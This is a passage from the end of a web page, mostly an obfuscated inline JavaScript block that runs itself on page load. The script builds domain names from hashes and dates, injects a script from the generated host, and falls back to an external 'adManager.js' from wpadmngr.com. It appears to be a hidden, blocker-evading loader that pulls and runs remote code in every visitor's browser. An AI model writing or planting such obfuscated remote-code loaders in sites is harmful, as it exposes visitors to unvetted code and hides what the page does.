x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>